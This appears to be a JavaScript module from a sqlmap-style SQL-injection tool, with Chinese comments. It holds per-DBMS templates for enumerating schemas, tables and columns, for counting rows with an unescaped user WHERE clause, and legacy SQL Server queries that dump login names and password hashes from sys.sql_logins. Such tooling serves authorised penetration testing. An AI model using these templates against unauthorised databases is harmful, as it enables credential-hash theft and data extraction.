// SQLite 用 sqlite_master（表搜索）+ 逐表 pragma_table_info（列搜索，返回 null 由调用方迭代）。
// ============================================================================
export const SEARCH_COLUMNS_QUERY = {
  MySQL: (searchTerm) =>
    `SELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name) SEPARATOR ',') FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
  PostgreSQL: (searchTerm) =>
    `SELECT string_agg(table_schema || '.' || table_name || '.' || column_name, ',') FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
  'SQL Server': (searchTerm) =>
    `SELECT string_agg(TABLE_SCHEMA + '.' + TABLE_NAME + '.' + COLUMN_NAME, ',') FROM information_schema.columns WHERE COLUMN_NAME LIKE '%${escSql(searchTerm)}%'`,
  Oracle: (searchTerm) =>
    `SELECT listagg(owner || '.' || table_name || '.' || column_name, ',') WITHIN GROUP (ORDER BY owner, table_name, column_name) FROM all_tab_columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
  // SQLite 无 information_schema，pragma_table_info 需逐表查询 -> null，由 searchColumns 迭代处理
  SQLite: null,
  ClickHouse: (searchTerm) =>
    `SELECT groupArray(concat(database, '.', table, '.', name)) FROM system.columns WHERE name LIKE '%${escSql(searchTerm)}%'`,
  DB2: (searchTerm) =>
    `SELECT listagg(TABSCHEMA || '.' || TABNAME || '.' || COLNAME, ',') FROM SYSCAT.COLUMNS WHERE COLNAME LIKE '%${escSql(searchTerm)}%'`,
  Sybase: (searchTerm) =>
    `SELECT list(db_name() || '.' || so.name || '.' || sc.name) FROM syscolumns sc, sysobjects so WHERE sc.id=so.id AND sc.name LIKE '%${escSql(searchTerm)}%'`,
  Firebird: (searchTerm) =>
    `SELECT list(rdb$relation_name || '.' || rdb$field_name) FROM rdb$relation_fields WHERE rdb$field_name LIKE '%${escSql(searchTerm)}%'`,
  H2: (searchTerm) =>
    `SELECT GROUP_CONCAT(table_schema || '.' || table_name || '.' || column_name) FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
  HSQLDB: (searchTerm) =>
    `SELECT GROUP_CONCAT(TABLE_SCHEMA || '.' || TABLE_NAME || '.' || COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%${escSql(searchTerm)}%'`,
  MonetDB: (searchTerm) =>
    `SELECT group_concat(s.name || '.' || t.name || '.' || c.name) FROM sys.columns c, sys.tables t, sys.schemas s WHERE c.table_id=t.id AND t.schema_id=s.id AND c.name LIKE '%${escSql(searchTerm)}%'`,
  Informix: (searchTerm) =>
    `SELECT list(t.tabname || '.' || c.colname) FROM syscolumns c, systables t WHERE c.tabid=t.tabid AND t.tabid>99 AND c.colname LIKE '%${escSql(searchTerm)}%'`,
  Access: null, // 无 information_schema，不支持跨表列搜索
  Derby: null, // GROUP_CONCAT 在 Derby 上不可靠，降级为 null
};
// 别名归一化（与 resolveDbms 一致）
SEARCH_COLUMNS_QUERY.MariaDB = SEARCH_COLUMNS_QUERY.MySQL;
SEARCH_COLUMNS_QUERY.TiDB = SEARCH_COLUMNS_QUERY.MySQL;
SEARCH_COLUMNS_QUERY.DM8 = SEARCH_COLUMNS_QUERY.Oracle;

export const SEARCH_TABLES_QUERY = {
  MySQL: (searchTerm) =>
    `SELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name) SEPARATOR ',') FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
  PostgreSQL: (searchTerm) =>
    `SELECT string_agg(table_schema || '.' || table_name, ',') FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
  'SQL Server': (searchTerm) =>
    `SELECT string_agg(TABLE_SCHEMA + '.' + TABLE_NAME, ',') FROM information_schema.tables WHERE TABLE_NAME LIKE '%${escSql(searchTerm)}%'`,
  Oracle: (searchTerm) =>
    `SELECT listagg(owner || '.' || table_name, ',') WITHIN GROUP (ORDER BY owner, table_name) FROM all_tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
  SQLite: (searchTerm) =>
    `SELECT group_concat(name) FROM sqlite_master WHERE type='table' AND name LIKE '%${escSql(searchTerm)}%'`,
  ClickHouse: (searchTerm) =>
    `SELECT groupArray(concat(database, '.', name)) FROM system.tables WHERE name LIKE '%${escSql(searchTerm)}%'`,
  DB2: (searchTerm) =>
    `SELECT listagg(TABSCHEMA || '.' || TABNAME, ',') FROM SYSCAT.TABLES WHERE TABNAME LIKE '%${escSql(searchTerm)}%'`,
  Sybase: (searchTerm) =>
    `SELECT list(db_name() || '.' || name) FROM sysobjects WHERE type='U' AND name LIKE '%${escSql(searchTerm)}%'`,
  Firebird: (searchTerm) =>
    `SELECT list(rdb$relation_name) FROM rdb$relations WHERE rdb$system_flag=0 AND rdb$relation_name LIKE '%${escSql(searchTerm)}%'`,
  H2: (searchTerm) =>
    `SELECT GROUP_CONCAT(table_schema || '.' || table_name) FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
  HSQLDB: (searchTerm) =>
    `SELECT GROUP_CONCAT(TABLE_SCHEMA || '.' || TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%${escSql(searchTerm)}%'`,
  MonetDB: (searchTerm) =>
    `SELECT group_concat(s.name || '.' || t.name) FROM sys.tables t, sys.schemas s WHERE t.schema_id=s.id AND t.name LIKE '%${escSql(searchTerm)}%'`,
  Informix: (searchTerm) =>
    `SELECT list(tabname) FROM systables WHERE tabtype='T' AND tabid>99 AND tabname LIKE '%${escSql(searchTerm)}%'`,
  Access: null,
  Derby: null,
};
SEARCH_TABLES_QUERY.MariaDB = SEARCH_TABLES_QUERY.MySQL;
SEARCH_TABLES_QUERY.TiDB = SEARCH_TABLES_QUERY.MySQL;
SEARCH_TABLES_QUERY.DM8 = SEARCH_TABLES_QUERY.Oracle;

// ============================================================================
// [sqlmap 对标 --count --where] 带 WHERE 条件的行数统计查询模板
// 各方言表引用方式与 SYS_QUERIES.data 一致（反引号/双引号/方括号）。
// WHERE 子句原样拼接（--where 是用户提供的 SQL 片段，不对 WHERE 内容做转义，与 sqlmap 行为一致）。
// ============================================================================
export const COUNT_WHERE_QUERY = {
  MySQL: (db, table, where) =>
    `SELECT COUNT(*) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\` WHERE ${where}`,
  PostgreSQL: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  'SQL Server': (db, table, where) =>
    `SELECT COUNT(*) FROM [${escBracket(table)}] WHERE ${where}`,
  Oracle: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  SQLite: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  ClickHouse: (db, table, where) =>
    `SELECT COUNT(*) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\` WHERE ${where}`,
  DB2: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  Sybase: (db, table, where) =>
    `SELECT COUNT(*) FROM [${escBracket(table)}] WHERE ${where}`,
  Firebird: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  H2: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  HSQLDB: (db, table, where) =>
    `SELECT COUNT(*) FROM \`${escBacktick(table)}\` WHERE ${where}`,
  MonetDB: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  Informix: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
  Access: null,
  Derby: (db, table, where) =>
    `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
};
COUNT_WHERE_QUERY.MariaDB = COUNT_WHERE_QUERY.MySQL;
COUNT_WHERE_QUERY.TiDB = COUNT_WHERE_QUERY.MySQL;
COUNT_WHERE_QUERY.DM8 = COUNT_WHERE_QUERY.Oracle;

// ============================================================================
// [P2-2] 版本分支解析：resolveSysQueries(dbms, version)
//
// 背景：指纹阶段已把版本解析进 ctx.dbmsVersion（{major,minor,raw}|null），但 SYS_QUERIES
// 各方言模板是静态的，未按版本分支。真实兼容问题：
//   · MySQL <5.7：mysql.user 无 authentication_string 列（引用即 Unknown column）
//     —— 5.7+ 反向同理（password 列已删除）；旧 IFNULL(a,b) 双列写法任何版本都报错
//   · SQL Server <2017：无 STRING_AGG/CONCAT_WS（2012-2016 会直接语法错误）
//   · SQL Server <2012：无 OFFSET/FETCH 分页、无 CONCAT（2008/2008R2 全废）
// 版本未知（null/major=null）→ 返回原 SYS_QUERIES 条目（保守按新版本处理，不做降级）。
// 返回值是「同构视图」：字段集与 SYS_QUERIES 完全一致，调用方零改动。
// ============================================================================

// SQL Server <2017 通用行拼接表达式：ISNULL(CAST(col AS nvarchar(max)),'') 用 CHAR(31) 连接。
// （CONCAT/CONCAT_WS 在 2012 之前不存在，`+` 遇 NULL 得 NULL，必须 ISNULL 兜底）
function mssqlLegacyRowExpr(cols) {
  const list = Array.isArray(cols) && cols.length
    ? cols
    : []; // 无列名 → 退化为 '*' 场景由调用方保证不发生（dumpData 前置猜列）
  return list
    .map((c) => `ISNULL(CAST([${String(c).replace(/[[\]]/g, '')}] AS nvarchar(max)),'')`)
    .join('+CHAR(31)+');
}

// SQL Server <2017 聚合：FOR XML PATH('') + TYPE 指令（2005+ 可用），替代 STRING_AGG。
// 行结构对齐现代路径（string_agg(CONCAT_WS(CHAR(31),...), CHAR(30))）：
//   每行 = CHAR(30) + 单元格(CHAR(31) 连接) → STUFF 掐头 1 字符去掉首行前导行分隔符。
// 分页用 ROW_NUMBER 窗口函数（2005+ 通用，2012+ 亦兼容），替代 OFFSET/FETCH（2012+ 才有）。
function mssqlLegacyData(db, table, cols, limit, offset = 0, where = null) {
  const w = where ? ` WHERE ${where}` : '';
  const rowExpr = mssqlLegacyRowExpr(cols);
  const cellExpr = rowExpr || `CAST('*' AS nvarchar(max))`;
  const inner = `SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS __rn, ${cellExpr} AS __row FROM [${escBracket(table)}]${w}`;
  return `SELECT STUFF((SELECT CHAR(30)+CAST(__row AS nvarchar(max)) FROM (SELECT * FROM (${inner}) p WHERE p.__rn > ${offset} AND p.__rn <= ${offset + limit}) x FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')`;
}

// SQL Server 旧版条目：标量聚合（库/表/列/凭据）+ 分页数据提取
const SYS_QUERIES_MSSQL_LEGACY = {
  databases: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.databases FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  tables: () =>
    "SELECT STUFF((SELECT ','+CAST(table_name AS nvarchar(max)) FROM information_schema.tables FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  columns: (db, table) =>
    `SELECT STUFF((SELECT ','+CAST(column_name AS nvarchar(max)) FROM information_schema.columns WHERE table_name='${escSql(table)}' FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')`,
  users: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  passwords: "SELECT STUFF((SELECT ','+CAST(name+':'+master.dbo.fn_varbintohexstr(password_hash) AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  data: (db, table, cols, limit, offset = 0, where = null) =>
    mssqlLegacyData(db, table, cols, limit, offset, where),
};

/**
 * 按版本解析 SYS_QUERIES 视图（同构字段，调用方零改动）。
 * @param {string} dbms 归一化 DBMS 名（resolveDbms 之后）
 * @param {{major:number|null, minor:number|null, raw?:string}|null} [version] 指纹阶段解析的版本
 * @returns {object} SYS_QUERIES[dbms] 原条目 或 版本降级变体
 */
export function resolveSysQueries(dbms, version) {
  const base = SYS_QUERIES[dbms];
  if (!base || !version || version.major == null) return base;
  if (dbms === 'MySQL') {
    // <5.7：authentication_string 列不存在 → 回退 password 列
    if (!versionAtLeast(version, 5.7) && base.passwordsLegacy) {
      return { ...base, passwords: base.passwordsLegacy };
    }
    return base;
  }
  if (dbms === 'SQL Server') {
    // <2017：无 STRING_AGG/CONCAT_WS → FOR XML PATH 全量降级（数据路径内含 <2012 分页处理）
    if (!versionAtLeast(version, 2017)) {
      return { ...base, ...SYS_QUERIES_MSSQL_LEGACY };
    }
    return base;
  }
  return base;
}
